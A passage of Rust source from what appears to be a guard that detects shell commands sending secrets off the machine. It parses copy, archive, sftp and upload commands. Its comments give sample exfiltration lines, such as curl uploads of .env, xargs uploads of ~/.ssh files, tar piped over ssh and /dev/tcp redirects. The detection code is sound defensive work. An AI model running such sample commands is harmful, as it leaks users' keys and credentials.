    /// secret: the home directory, or the workspace, which may hold an
    /// `.env` file, unless an exclude leaves every secret name out (`tar
    /// czf - . | ssh host …`). `tar -C dist .` packs `dist`.
    fn archived(&self, unit: &Unit, key: &str, written: &HashMap<String, Hit>) -> Option<Hit> {
        let archive = archive(unit, key)?;
        if !(archive.whole && archive.to.iter().all(|to| to == "-")) {
            return None;
        }
        archive.members.iter().find_map(|member| {
            self.secret_of(unit, member, true, true, written)
                .or_else(|| {
                    (!archive.leaves_out)
                        .then(|| self.workspace(unit, member))
                        .flatten()
                })
        })
    }

    /// `unit` with each word that names a file under a folder only known
    /// when it runs read by the name it ends in (see [`super::named`]),
    /// `curl -T "$PWD/.env"` sending `.env`. The folder may be the home
    /// directory, so a name that is a secret there is read as there:
    /// `"$x/.ssh/id_rsa"` is `~/.ssh/id_rsa`.
    fn named_send<'u>(&self, unit: &'u Unit) -> Cow<'u, Unit> {
        if unit.shell != Shell::Posix {
            return Cow::Borrowed(unit);
        }
        let names: Vec<Option<Arg>> = unit
            .args
            .iter()
            .map(|arg| {
                let name = super::named_in_unknown_folder(arg)?;
                let text = name.known()?;
                let home = Arg::Known(format!("~/{text}"));
                let secret = !text.starts_with(['/', '~'])
                    && matches!(
                        self.place(unit.shell, unit.scope(), &home, Access::Item),
                        Place::Sensitive(_, Sensitivity::Secret)
                    );
                Some(if secret { home } else { name })
            })
            .collect();
        if names.iter().all(Option::is_none) {
            return Cow::Borrowed(unit);
        }
        let args = unit
            .args
            .iter()
            .zip(names)
            .map(|(arg, name)| name.unwrap_or_else(|| arg.clone()))
            .collect();
        Cow::Owned(Unit {
            args,
            ..Unit::clone(unit)
        })
    }

    /// The secret `arg` names, when it names one (see [`Self::secret_of`]),
    /// with the files the line wrote from one.
    fn secret(&self, unit: &Unit, arg: &Arg, home: bool, glob: bool) -> Option<Hit> {
        self.secret_of(unit, arg, home, glob, &self.flow.written)
    }

    /// The secret `arg` names, when it names one: `home` also counts the
    /// home directory itself and any folder holding it, which hold them, for
    /// what copies a folder. `glob` says whether the shell expands a wildcard
    /// in it: it does for a word of its own, not for a part of one (`@f`).
    /// A file in `written` holds the secret it was written from.
    fn secret_of(
        &self,
        unit: &Unit,
        arg: &Arg,
        home: bool,
        glob: bool,
        written: &HashMap<String, Hit>,
    ) -> Option<Hit> {
        let name = super::named_in_unknown_folder(arg);
        let arg = name.as_ref().unwrap_or(arg);
        let text = arg.known().filter(|text| *text != "-")?;
        // A wildcard in the name of a file the shell does not expand is a
        // letter: it names no secret.
        let named = text.rsplit(['/', '\\']).next().unwrap_or(text);
        if !glob && glob::has_wildcard(named) {
            return None;
        }
        let words = if is_environ(text) {
            Some(ENVIRONMENT)
        } else if let Some(words) = secret_name(text, unit.shell, unit.hidden, glob) {
            Some(words)
        } else if public_key(text) {
            return None;
        } else {
            match self.place(unit.shell, unit.scope(), arg, Access::Item) {
                Place::Sensitive(words, Sensitivity::Secret) => Some(words),
                Place::Home { .. } if home => Some(HOME),
                Place::Top(ROOT) if home => Some(HOME),
                _ => None,
            }
        };
        let words = words.or_else(|| {
            if written.is_empty() {
                return None;
            }
            let key = self.resolver.file_key(unit.dir.as_ref(), arg, unit.shell)?;
            written.get(&key).map(|hit| hit.words)
        })?;
        Some(Hit {
            words,
            target: text.to_string(),
        })
    }

    /// A folder that holds the workspace, which may hold an `.env` file.
    fn workspace(&self, unit: &Unit, arg: &Arg) -> Option<Hit> {
        let text = arg.known()?;
        matches!(
            self.place(unit.shell, unit.scope(), arg, Access::Item),
            Place::Workspace { .. }
        )
        .then(|| Hit {
            words: WORKSPACE,
            target: text.to_string(),
        })
    }

    fn sent(&mut self, hit: &Hit) {
        let reason = if hit.words == WORKSPACE {
            "sends your workspace off the machine, and it may hold an .env file".to_string()
        } else {
            format!("sends {} off the machine", hit.words)
        };
        self.add(
            Rule::SendSecret,
            reason,
            Some(&Arg::Known(hit.target.clone())),
        );
    }

    /// Sending a secret: an upload that names a file, a copy to another
    /// machine, a program that sends what it is piped or redirected, and a
    /// sender handed one by a substitution.
    pub(super) fn send(&mut self, at: usize, unit: &Unit, key: &str) {
        if !self.flow.active {
            return;
        }
        if self.flow.unfollowed {
            self.flow.unfollowed = false;
            self.add(
                Rule::Unreadable,
                "writes a secret into files too many times to follow",
                None,
            );
        }
        // A call of an alias with words of its own runs the alias's last
        // command with them, which is judged as such; any other call of a
        // function or an alias sends what it is given when its body sends.
        let aliased = self.aliased(unit);
        let alias_key = if let Cow::Owned(unit) = &aliased {
            unit.key()
        } else {
            self.call(at);
            None
        };
        let key = alias_key.as_deref().unwrap_or(key);
        // A file named under a folder only known when it runs is sent by
        // its name (`curl -T "$PWD/.env"`).
        let named = self.named_send(&aliased);
        let unit: &Unit = &named;
        for file in uploads(unit, key) {
            if let Some(hit) = self.secret(unit, &file.arg, false, file.word) {
                self.sent(&hit);
            }
        }
        if key == "sftp" {
            self.sftp_batch(at, unit);
        }
        self.copy(unit, key);
        let network = NETWORK.contains(&key);
        let to_network = self.flow.to_network.get(at).copied().unwrap_or(false);
        let sink =
            takes_input(unit, key) || to_network || (network && unit.args.contains(&Arg::Input));
        if sink {
            let piped = self
                .flow
                .stage_of(at)
                .and_then(|stage| self.flow.piped(stage));
            let own = if to_network {
                self.flow.own(at).or(self.flow.fed(at))
            } else {
                None
            };
            let hit = piped.or(self.flow.stdin(at)).or(own).cloned();
            if let Some(hit) = hit {
                self.sent(&hit);
            }
        }
        // `ls ~/.ssh/* | xargs -I{} curl -T {} url`: the names the stage
        // before lists are the files it is handed.
        if network
            && unit.args.contains(&Arg::Input)
            && unit.wrappers.iter().any(|wrapper| wrapper == "xargs")
        {
            let (listed, _) = self.expand(unit, &Arg::Input);
            let hit = listed
                .iter()
                .find_map(|arg| self.secret(unit, arg, false, true));
            if let Some(hit) = hit {
                self.sent(&hit);
            }
        }
        if network {
            if let Some(hit) = self.flow.fed(at).cloned() {
                self.sent(&hit);
            }
        }
    }

    /// A call of a function or an alias whose body sends (see
    /// [`Self::follow_calls`]): a secret it names in its words (`f .env`,
    /// which the body reads as `$1`), is handed by a substitution or a
    /// variable, is piped (`cat .env | f`) or has redirected onto its input
    /// (`f < .env`) may leave.
    fn call(&mut self, at: usize) {
        let Some(call) = self.flow.calls.get(&at).filter(|call| call.sends) else {
            return;
        };
        let hit = call
            .given
            .as_ref()
            .or_else(|| self.flow.fed(at))
            .or_else(|| {
                self.flow
                    .stage_of(at)
                    .and_then(|stage| self.flow.piped(stage))
            })
            .or_else(|| self.flow.stdin(at))
            .cloned();
        if let Some(hit) = hit {
            self.sent(&hit);
        }
    }

    /// The files an `sftp` batch puts on the other machine: the batch is
    /// its input (a here-string, an ANSI-C one included, a here-document, or
    /// what an `echo` or a `printf` before it prints) unless `-b` names a
    /// file other than its input (`-`, `/dev/stdin`); a process substitution
    /// it reads (`-b <(echo …)`, `< <(echo …)`) is read as well. A `put -r`
    /// of a folder that holds the workspace sends it.
    fn sftp_batch(&mut self, at: usize, unit: &Unit) {
        let mut batches = Vec::new();
        if let Some(Arg::Known(text)) = &unit.stdin {
            batches.push(text.clone());
        }
        // A here-string the shell expands, of which an ANSI-C string is
        // read: `<<< $'cd x\nput .env'`.
        batches.extend(
            self.split
                .redirects
                .iter()
                .filter(|redirect| redirect.text && redirect.units.contains(&at))
                .filter_map(|redirect| ansi_c(redirect.target.text())),
        );
        let batch = option_value(&unit.args, "-b");
        let from_input = batch.as_ref().is_none_or(|file| {
            file.known()
                .is_some_and(|file| named(file, false).arg.known() == Some("-"))
        });
        if from_input {
            batches.extend(self.printed_before(unit));
        }
        for nested in self
            .split
            .nested
            .iter()
            .filter(|nested| nested.command.contains(&at))
        {
            for inside in nested.inside.clone() {
                if let Some(text) = self.split.units.get(inside).and_then(printed) {
                    batches.push(text);
                }
            }
        }
        for text in batches {
            for (file, recursive) in sftp_puts(&text) {
                let file = Arg::Known(file);
                let hit = self
                    .secret(unit, &file, true, true)
                    .or_else(|| recursive.then(|| self.workspace(unit, &file)).flatten());
                if let Some(hit) = hit {
                    self.sent(&hit);
                }
            }
        }
    }

    /// What an `echo` or a `printf` in the stage before `unit` prints, when
    /// its words are known: the lines a program reading its input is given.
    fn printed_before(&self, unit: &Unit) -> Option<String> {
        let stage = unit.stage.filter(|stage| stage.index > 0)?;
        let at = *self.producers.get(&(stage.pipeline, stage.index - 1))?;
        printed(self.split.units.get(at)?)
    }

    /// `scp`, `rsync`, `sftp`, `rclone` and the cloud copiers given a
    /// destination on another machine: what they take from here goes. A
    /// copy of a whole folder that holds the workspace sends what it holds,
    /// unless it leaves out `.env` files.
    fn copy(&mut self, unit: &Unit, key: &str) {
        let values: &[&str] = match key {
            "scp" => &SCP_VALUES,
            "sftp" => &SFTP_VALUES,
            "rsync" => &RSYNC_VALUES,
            "rclone" | "aws" | "gcloud" => &CLOUD_VALUES,
            "gsutil" => &GSUTIL_VALUES,
            _ => return,
        };
        let all = operands(&unit.args, values);
        let verb = |at: usize, verbs: &[&str]| {
            all.get(at)
                .and_then(|arg| arg.known())
                .is_some_and(|word| verbs.contains(&word))
        };
        let skip = match key {
            "rclone" if verb(0, &["copy", "sync", "move", "copyto", "moveto", "bisync"]) => 1,
            "aws" if verb(0, &["s3"]) && verb(1, &["cp", "mv", "sync"]) => 2,
            "gsutil" if verb(0, &["cp", "mv", "rsync"]) => 1,
            "gcloud" if verb(0, &["storage"]) && verb(1, &["cp", "mv", "rsync"]) => 2,
            "scp" | "sftp" | "rsync" => 0,
            _ => return,
        };
        let args = unit.args.as_slice();
        let whole = match key {
            "scp" => has_flag(args, Some('r'), None),
            "rsync" => {
                has_flag(args, Some('r'), Some("recursive"))
                    || has_flag(args, Some('a'), Some("archive"))
            }
            "rclone" => true,
            "aws" => verb(1, &["sync"]) || has_flag(args, None, Some("recursive")),
            "gsutil" | "gcloud" => {
                verb(skip - 1, &["rsync"])
                    || has_flag(args, Some('r'), Some("recursive"))
                    || has_flag(args, Some('R'), None)
            }
            _ => false,
        } && !leaves_out_dotenv(args);
        let posix = unit.shell == Shell::Posix;
        let Some((destination, sources)) = all.get(skip..).and_then(<[&Arg]>::split_last) else {
            return;
        };
        if !to_other_machine(destination, matches!(key, "scp" | "sftp"), posix) {
            return;
        }
        for source in sources {
            if to_other_machine(source, false, posix) {
                continue;
            }
            let hit = self
                .secret(unit, source, true, true)
                .or_else(|| whole.then(|| self.workspace(unit, source)).flatten());
            if let Some(hit) = hit {
                self.sent(&hit);
            }
        }
    }
}

/// What runs for a command hands it what it reads: a substitution, or a
/// script it starts (see [`crate::unit::Split::nested`]).
fn handed(flow: &mut Flow, nested: &[Nested]) {
    for nested in nested {
        let hit = nested.inside.clone().find_map(|at| flow.own(at).cloned());
        if let Some(hit) = hit {
            for at in nested.command.clone() {
                if let Some(slot) = flow.fed.get_mut(at).filter(|slot| slot.is_none()) {
                    *slot = Some(hit.clone());
                }
            }
        }
    }
}

/// The secret a pipeline's earlier stage reads, for each pipeline: the
/// first stage that reads one or is handed one, also for each pipeline a
/// stage of it runs in.
fn stages(flow: &mut Flow) {
    for at in 0..flow.own.len() {
        let (Some(stage), Some(hit)) = (flow.stage_of(at), flow.own(at).or(flow.fed(at))) else {
            continue;
        };
        let hit = hit.clone();
        // From the stage up through the stages of the pipelines it runs
        // in, while this is the earliest read: an outer pipeline's
        // entry is set once for each inner one, so what an earlier
        // read already set is as far as the walk needs to go.
        let mut stage = stage;
        loop {
            let first = flow
                .stage
                .get(&stage.pipeline)
                .is_none_or(|(first, _)| stage.index < *first);
            if !first {
                break;
            }
            flow.stage
                .insert(stage.pipeline, (stage.index, hit.clone()));
            match flow.parent.get(&stage.pipeline) {
                Some(outer) => stage = *outer,
                None => break,
            }
        }
    }
}

/// A secret a `source` of a secret file earlier on the line may have set
/// in a variable `unit` reads.
fn sourced(flow: &Flow, at: usize, unit: &Unit) -> Option<Hit> {
    let (from, hit) = flow.sourced.as_ref()?;
    let reads = unit
        .args
        .iter()
        .any(|arg| arg.is_unknown() && !referenced(arg.text()).is_empty());
    (at > *from && reads).then(|| hit.clone())
}

/// Whether a word of `export`, `declare` and the like is a substitution
/// whose output it reads as `NAME=VALUE` words (`export $(cat .env |
/// xargs)`), not an assignment of its own (`export k=$(cat .env)`, which
/// sets `k` alone).
fn sets_from_output(arg: &Arg) -> bool {
    let text = arg.text().trim_start_matches('"');
    arg.is_unknown() && (text.starts_with("$(") || text.starts_with('`'))
}

/// Whether `unit` is `exec` with no program, which makes its redirects the
/// shell's own for the rest of the line: `exec < .env`.
fn replaces_input(unit: &Unit) -> bool {
    unit.shell == Shell::Posix
        && unit.args.is_empty()
        && unit.key().is_some_and(|key| key == "exec")
}

/// The variables a builtin sets from what it reads: `read`'s names (or
/// `REPLY`) and the array of `-a`, `mapfile`'s and `readarray`'s array (or
/// `MAPFILE`), and the name `printf -v` prints into. In PowerShell, the
/// variable `Set-Variable` sets from what it is handed (`gc .env | sv k`),
/// and the one a cmdlet's `-OutVariable` or `-PipelineVariable` sets from
/// what it prints (see [`crate::powershell::variables_set`]).
fn sets(unit: &Unit) -> Vec<String> {
    if unit.shell == Shell::PowerShell {
        return unit
            .key()
            .map(|key| crate::powershell::variables_set(&key, &unit.args))
            .unwrap_or_default();
    }
    if unit.shell != Shell::Posix {
        return Vec::new();
    }
    let Some(key) = unit.key() else {
        return Vec::new();
    };
    let args = unit.args.as_slice();
    let known = |found: Vec<&Arg>| -> Vec<String> {
        found
            .into_iter()
            .filter_map(Arg::known)
            .map(str::to_string)
            .collect()
    };
    match key.as_str() {
        "read" => {
            let mut names = known(operands(
                args,
                &["-a", "-d", "-i", "-n", "-N", "-p", "-t", "-u"],
            ));
            names.extend(
                option_value(args, "-a")
                    .as_ref()
                    .and_then(Arg::known)
                    .map(str::to_string),
            );
            if names.is_empty() {
                names.push("REPLY".to_string());
            }
            names
        }
        "mapfile" | "readarray" => {
            let names = known(operands(args, &["-d", "-n", "-O", "-s", "-u", "-C", "-c"]));
            vec![names
                .last()
                .cloned()
                .unwrap_or_else(|| "MAPFILE".to_string())]
        }
        "printf" => option_value(args, "-v")
            .as_ref()
            .and_then(Arg::known)
            .map(str::to_string)
            .into_iter()
            .collect(),
        _ => Vec::new(),
    }
}

/// The value of a short option, given apart (`-b file`) or joined to it
/// (`-bfile`): the last one given.
fn option_value(args: &[Arg], option: &str) -> Option<Arg> {
    let mut iter = args.iter();
    let mut value = None;
    while let Some(arg) = iter.next() {
        let Some(text) = arg.known() else { continue };
        if text == "--" {
            break;
        }
        if text == option {
            value = iter.next().cloned();
        } else if let Some(rest) = text.strip_prefix(option).filter(|rest| !rest.is_empty()) {
            value = Some(Arg::Known(rest.to_string()));
        }
    }
    value
}

/// What `echo` or `printf` prints, when its words are known: `echo`
/// without its options (`-n`, `-e`), `printf` with its format applied to
/// its arguments (`printf 'put %s\n' .env`). Escapes such as `\n` are read.
fn printed(unit: &Unit) -> Option<String> {
    let words: Vec<&str> = unit.args.iter().map(Arg::known).collect::<Option<_>>()?;
    let text = match unit.key()?.as_str() {
        "echo" => {
            let start = words
                .iter()
                .position(|word| {
                    !(word.len() > 1
                        && word.starts_with('-')
                        && word[1..]
                            .chars()
                            .all(|letter| matches!(letter, 'n' | 'e' | 'E')))
                })
                .unwrap_or(words.len());
            words.get(start..).unwrap_or_default().join(" ")
        }
        "printf" => {
            let words = match words.first() {
                Some(&"--") => words.get(1..).unwrap_or_default(),
                _ => words.as_slice(),
            };
            let (format, values) = words.split_first()?;
            printf(format, values)
        }
        _ => return None,
    };
    Some(unescape_c(&text))
}

/// `printf`'s output for a known format and values: each conversion takes
/// the next value (`%%` is a `%`), and the format is used again while
/// values are left. A value is printed as written, whatever the conversion.
fn printf(format: &str, values: &[&str]) -> String {
    let mut out = String::new();
    let mut values = values.iter();
    loop {
        let mut took = false;
        let mut chars = format.chars().peekable();
        while let Some(letter) = chars.next() {
            if letter != '%' {
                out.push(letter);
                continue;
            }
            if chars.peek() == Some(&'%') {
                chars.next();
                out.push('%');
                continue;
            }
            // Flags, width and precision, then the conversion letter.
            while chars.peek().is_some_and(|next| !next.is_ascii_alphabetic()) {
                chars.next();
            }
            chars.next();
            took = true;
            if let Some(value) = values.next() {
                out.push_str(value);
            }
        }
        if !took || values.len() == 0 {
            break;
        }
    }
    out
}

/// The escapes `echo -e`, `printf` and an ANSI-C string read: `\n`, `\t`,
/// `\\`, `\'` and `\"`; any other is kept as written.
fn unescape_c(text: &str) -> String {
    let mut out = String::new();
    let mut chars = text.chars();
    while let Some(letter) = chars.next() {
        if letter != '\\' {
            out.push(letter);
            continue;
        }
        match chars.next() {
            Some('n') => out.push('\n'),
            Some('t') => out.push('\t'),
            Some(other @ ('\\' | '\'' | '"')) => out.push(other),
            Some(other) => {
                out.push('\\');
                out.push(other);
            }
            None => out.push('\\'),
        }
    }
    out
}

/// The text of an ANSI-C string written as a whole word (`$'cd x\nput
/// .env'`), with its escapes read.
fn ansi_c(text: &str) -> Option<String> {
    let inner = text.strip_prefix("$'")?.strip_suffix('\'')?;
    Some(unescape_c(inner))
}

/// The files an `sftp` batch puts, each with whether it is put whole (`put
/// -r`): the first operand of each `put` and `reput` (the second is where
/// it lands), and every operand of `mput`. A line is split into words as
/// sftp splits it, with quotes and backslashes read.
fn sftp_puts(text: &str) -> Vec<(String, bool)> {
    let mut files = Vec::new();
    for line in text.lines() {
        let words = sftp_words(line);
        let Some((command, rest)) = words.split_first() else {
            continue;
        };
        let recursive = rest
            .iter()
            .any(|word| word.starts_with('-') && word.contains(['r', 'R']));
        let operands = rest.iter().filter(|word| !word.starts_with('-'));
        match command.trim_start_matches(['-', '@']) {
            "put" | "reput" => files.extend(operands.take(1).map(|file| (file.clone(), recursive))),
            "mput" => files.extend(operands.map(|file| (file.clone(), recursive))),
            _ => {}
        }
    }
    files
}

/// The words of one line of an `sftp` batch: split on blanks, with single
/// and double quotes holding blanks and a backslash escaping the next
/// letter, as sftp reads them.
fn sftp_words(line: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut word = String::new();
    let mut started = false;
    let mut quote: Option<char> = None;
    let mut chars = line.chars();
    while let Some(letter) = chars.next() {
        match (quote, letter) {
            (_, '\\') => {
                started = true;
                word.extend(chars.next());
            }
            (Some(open), letter) if letter == open => quote = None,
            (Some(_), letter) => word.push(letter),
            (None, '\'' | '"') => {
                started = true;
                quote = Some(letter);
            }
            (None, letter) if letter.is_whitespace() => {
                if started {
                    words.push(std::mem::take(&mut word));
                    started = false;
                }
            }
            (None, letter) => {
                started = true;
                word.push(letter);
            }
        }
    }
    if started {
        words.push(word);
    }
    words
}

/// The names of files that hold secrets which a folder sent whole may hold,
/// one of each kind: an exclude list has to leave every one out.
const SECRET_SAMPLES: [&str; 4] = [".env", ".env.local", ".envrc", "prod.env"];

/// Whether a copy leaves out every file that holds secrets by its name:
/// its `--exclude` patterns together match each of [`SECRET_SAMPLES`]
/// (`--exclude '.env*' --exclude '*.env'`). `--exclude .env` alone still
/// sends `.env.local` and `.envrc`.
fn leaves_out_dotenv(args: &[Arg]) -> bool {
    let mut patterns = Vec::new();
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        let Some(text) = arg.known() else { continue };
        let pattern = if text == "--exclude" {
            iter.next().and_then(Arg::known)
        } else {
            text.strip_prefix("--exclude=")
        };
        patterns.extend(pattern.map(str::to_string));
    }
    leaves_out_secrets(&patterns)
}

/// Whether the exclude patterns together match each of [`SECRET_SAMPLES`],
/// by the last part of each pattern.
fn leaves_out_secrets(patterns: &[String]) -> bool {
    SECRET_SAMPLES.iter().all(|sample| {
        patterns.iter().any(|pattern| {
            let pattern = pattern.trim_end_matches('/');
            let name = pattern.rsplit('/').next().unwrap_or(pattern);
            glob::matches(name, sample, Flavour::Posix, true)
        })
    })
}

/// The file a program that prints names reads its list of names from:
/// `file -f` (`--files-from`), and `--files0-from` of `du` and `wc`.
fn list_file(args: &[Arg], key: &str) -> Option<Arg> {
    let mut iter = args.iter();
    let mut found = None;
    while let Some(arg) = iter.next() {
        let Some(text) = arg.known() else { continue };
        if text == "--" {
            break;
        }
        let (name, value) = text
            .split_once('=')
            .map_or((text, None), |(name, value)| (name, Some(value)));
        let lists = match key {
            "file" => matches!(name, "-f" | "--files-from"),
            "du" | "wc" => name == "--files0-from",
            _ => false,
        };
        if lists {
            found = match value {
                Some(value) => Some(Arg::Known(value.to_string())),
                None => iter.next().cloned(),
            };
        } else if key == "file" {
            if let Some(value) = text.strip_prefix("-f").filter(|value| !value.is_empty()) {
                found = Some(Arg::Known(value.to_string()));
            }
        }
    }
    found
}

/// The copies one command makes on this machine, each as the file it reads,
/// the file it writes and whether it copies a whole folder: `cp`, `mv`,
/// `install`, `ditto` and `ln` (into a folder, under the source's name
/// there), `dd if= of=`, an `rsync` to a place on this machine, and the
/// archive `tar` or `zip` writes to a file.
fn copied_by(unit: &Unit, key: &str) -> Vec<(Arg, String, bool, bool)> {
    let args = unit.args.as_slice();
    let mut found = Vec::new();
    let mut into = |sources: Vec<&Arg>, destination: &str, whole: bool, workspace: bool| {
        for source in sources {
            found.push((source.clone(), destination.to_string(), whole, workspace));
            if let Some(text) = source.known() {
                let name = text.trim_end_matches('/');
                let name = name.rsplit('/').next().unwrap_or(name);
                if !name.is_empty() && !matches!(name, "." | "..") {
                    let folder = destination.trim_end_matches('/');
                    found.push((source.clone(), format!("{folder}/{name}"), whole, workspace));
                }
            }
        }
    };
    match key {
        "cp" | "mv" | "install" | "ditto" | "ln" => {
            let (sources, destination) = super::sources_and_destination(args, &super::COPY_VALUED);
            let whole = key == "ditto"
                || has_flag(args, Some('r'), Some("recursive"))
                || has_flag(args, Some('R'), None)
                || has_flag(args, Some('a'), Some("archive"));
            if let Some(destination) = destination.as_ref().and_then(Arg::known) {
                into(sources, destination, whole, whole);
            }
        }
        "rsync" => {
            let all = operands(args, &RSYNC_VALUES);
            let posix = unit.shell == Shell::Posix;
            if let Some((destination, sources)) = all.split_last() {
                if !to_other_machine(destination, false, posix) {
                    let whole = has_flag(args, Some('r'), Some("recursive"))
                        || has_flag(args, Some('a'), Some("archive"));
                    let sources = sources
                        .iter()
                        .copied()
                        .filter(|source| !to_other_machine(source, false, posix))
                        .collect();
                    if let Some(destination) = destination.known() {
                        into(
                            sources,
                            destination,
                            whole,
                            whole && !leaves_out_dotenv(args),
                        );
                    }
                }
            }
        }
        "dd" => {
            let value = |name: &str| {
                args.iter()
                    .filter_map(Arg::known)
                    .filter_map(|text| text.strip_prefix(name))
                    .next_back()
            };
            if let (Some(from), Some(to)) = (value("if="), value("of=")) {
                found.push((Arg::Known(from.to_string()), to.to_string(), false, false));
            }
        }
        _ => {
            if let Some(archive) = archive(unit, key) {
                for name in archive.to.iter().filter(|name| *name != "-") {
                    for member in &archive.members {
                        let workspace = archive.whole && !archive.leaves_out;
                        found.push((member.clone(), name.clone(), archive.whole, workspace));
                    }
                }
            }
        }
    }
    found
}

/// What `tar` (creating) or `zip` packs: the files it writes the archive to
/// (`-` for its output), the members, each under the folder a `-C` before
/// it moves to, whether it packs folders whole, and whether its exclude
/// patterns leave every secret name out.
struct Archive {
    to: Vec<String>,
    members: Vec<Arg>,
    whole: bool,
    leaves_out: bool,
}

/// The archive `unit` writes, when it is `tar` creating one or `zip`.
fn archive(unit: &Unit, key: &str) -> Option<Archive> {
    match key {
        "tar" | "bsdtar" | "gtar" => tar_archive(&unit.args),
        "zip" => zip_archive(&unit.args),
        _ => None,
    }
}

/// `tar`'s archive, read from its options in any of their forms: a first
/// word of letters with no dash (`tar czf x.tgz .`), a bundle (`-czf`), or
/// long options (`--create --file=x.tgz`). Its value-taking letters take
/// the next words in turn.
fn tar_archive(args: &[Arg]) -> Option<Archive> {
    const VALUED: &str = "fCbTXgKLNV";
    let mut create = false;
    let mut file: Option<String> = None;
    let mut folder: Option<String> = None;
    let mut members = Vec::new();
    let mut excludes = Vec::new();
    let mut whole = true;
    let mut iter = args.iter().enumerate().peekable();
    // A letter's value, from the rest of its bundle or the next word.
    let mut pending: Vec<char> = Vec::new();
    while let Some((at, arg)) = iter.next() {
        let Some(text) = arg.known() else {
            if pending.is_empty() {
                members.push(arg.clone());
            } else {
                pending.remove(0);
            }
            continue;
        };
        if let Some(letter) = (!pending.is_empty()).then(|| pending.remove(0)) {
            match letter {
                'f' => file = Some(text.to_string()),
                'C' => folder = Some(text.to_string()),
                _ => {}
            }
            continue;
        }
        if let Some(long) = text.strip_prefix("--") {
            let (name, attached) = long
                .split_once('=')
                .map_or((long, None), |(name, value)| (name, Some(value)));
            let mut value = || match attached {
                Some(value) => Some(value.to_string()),
                None => iter
                    .next()
                    .and_then(|(_, arg)| arg.known())
                    .map(str::to_string),
            };
            match name {
                "create" => create = true,
                "no-recursion" => whole = false,
                "file" => file = value(),
                "directory" => folder = value(),
                "exclude" => excludes.extend(value()),
                "files-from"
                | "exclude-from"
                | "owner"
                | "group"
                | "mode"
                | "transform"
                | "xform"
                | "label"
                | "format"
                | "use-compress-program"
                | "newer"
                | "after-date"
                | "suffix"
                | "blocking-factor"
                | "record-size"
                | "volno-file"
                | "info-script"
                | "rsh-command"
                | "tape-length"
                | "add-file"
                    if attached.is_none() =>
                {
                    iter.next();
                }
                _ => {}
            }
            continue;
        }
        let bundle = match text.strip_prefix('-') {
            Some(bundle) if !bundle.is_empty() => Some((bundle, true)),
            None if at == 0 && text.chars().all(|letter| letter.is_ascii_alphabetic()) => {
                Some((text, false))
            }
            _ => None,
        };
        if let Some((bundle, dashed)) = bundle {
            for (index, letter) in bundle.char_indices() {
                if letter == 'c' {
                    create = true;
                }
                if VALUED.contains(letter) {
                    let rest = &bundle[index + 1..];
                    if dashed && !rest.is_empty() {
                        match letter {
                            'f' => file = Some(rest.to_string()),
                            'C' => folder = Some(rest.to_string()),
                            _ => {}
                        }
                        break;
                    }
                    pending.push(letter);
                    if dashed {
                        break;
                    }
                }
            }
            continue;
        }
        let member = match &folder {
            Some(folder) if !text.starts_with('/') => {
                format!("{}/{text}", folder.trim_end_matches('/'))
            }
            _ => text.to_string(),
        };
        members.push(Arg::Known(member));
    }
    create.then(|| Archive {
        to: file.into_iter().collect(),
        members,
        whole,
        leaves_out: leaves_out_secrets(&excludes),
    })
}

/// `zip`'s archive: its first operand (with `.zip` added when it has no
/// extension), and the files after it, recursed into with `-r`; `-x` names
/// patterns to leave out, up to the next option.
fn zip_archive(args: &[Arg]) -> Option<Archive> {
    const VALUED: [&str; 8] = [
        "-b",
        "-n",
        "-t",
        "-tt",
        "-P",
        "-O",
        "--temp-path",
        "--suffixes",
    ];
    let mut operands = Vec::new();
    let mut excludes = Vec::new();
    let mut whole = false;
    let mut excluding = false;
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        let Some(text) = arg.known() else {
            if !excluding {
                operands.push(arg.clone());
            }
            continue;
        };
        if VALUED.contains(&text) {
            iter.next();
            excluding = false;
        } else if matches!(text, "-x" | "--exclude") {
            excluding = true;
        } else if matches!(text, "-i" | "--include") {
            excluding = false;
            // What follows are patterns to keep, not files.
            for _ in iter
                .by_ref()
                .take_while(|arg| arg.known().is_none_or(|text| !text.starts_with('-')))
            {
            }
        } else if text.starts_with('-') && text.len() > 1 {
            excluding = false;
            if text == "--recurse-paths" || (!text.starts_with("--") && text.contains(['r', 'R'])) {
                whole = true;
            }
        } else if excluding {
            excludes.push(text.to_string());
        } else {
            operands.push(arg.clone());
        }
    }
    let (archive, members) = operands.split_first()?;
    let archive = archive.known()?;
    let mut to = vec![archive.to_string()];
    let name = archive.rsplit('/').next().unwrap_or(archive);
    if archive != "-" && !name.contains('.') {
        to.push(format!("{archive}.zip"));
    }
    Some(Archive {
        to,
        members: members.to_vec(),
        whole,
        leaves_out: leaves_out_secrets(&excludes),
    })
}

/// What `gpg --export-secret-keys` (or `--export-secret-subkeys`) is told to
/// print: the private keys of the keyring, which no path names.
fn exports_secret_keys(unit: &Unit, key: &str) -> Option<String> {
    if !matches!(key, "gpg" | "gpg2") {
        return None;
    }
    unit.args
        .iter()
        .filter_map(Arg::known)
        .find(|text| text.starts_with("--export-secret-"))
        .map(str::to_string)
}

/// A secret a variable the unit's arguments read holds (see
/// [`Unit::variables`]).
fn mentions(unit: &Unit, held: &HashMap<String, Hit>) -> Option<Hit> {
    if held.is_empty() {
        return None;
    }
    unit.variables()
        .iter()
        .find_map(|name| held.get(name).cloned())
}

/// A secret a variable `text`, an expansion the guard cannot resolve,
/// names holds: `$k`, `"$k"`, `${k}`, but not `$key`.
fn text_mentions(text: &str, held: &HashMap<String, Hit>) -> Option<Hit> {
    if held.is_empty() {
        return None;
    }
    referenced(text)
        .iter()
        .find_map(|name| held.get(name).cloned())
}

/// Whether the path is a network connection bash opens in its own
/// redirects (`> /dev/tcp/host/1`); a program that opens it as a path finds
/// no such file.
fn network_device(text: &str) -> bool {
    text.starts_with("/dev/tcp/") || text.starts_with("/dev/udp/")
}

/// Whether `arg` is on another machine: `host:path`, a URL, a destination
/// only known when it runs that holds a colon, or (`unknown`) any
/// destination only known when it runs. On POSIX (`posix`) there are no
/// drives, so a one-letter host is a host too: `h:`, `h:/tmp`.
fn to_other_machine(arg: &Arg, unknown: bool, posix: bool) -> bool {
    match arg {
        Arg::Known(text) => {
            remote(arg)
                || (posix
                    && text.find(':') == Some(1)
                    && text.starts_with(|first: char| first.is_ascii_alphanumeric()))
                || text.contains("://")
                || text.starts_with(':')
                || (text.starts_with('[') && text.contains("]:"))
        }
        Arg::Unknown(_) | Arg::Template { .. } => unknown || arg.text().contains(':'),
        Arg::Input | Arg::Null => false,
    }
}

/// The arguments of `unit` that may name a file it reads, without the ones
/// that name a key it logs in with or are code an interpreter is given
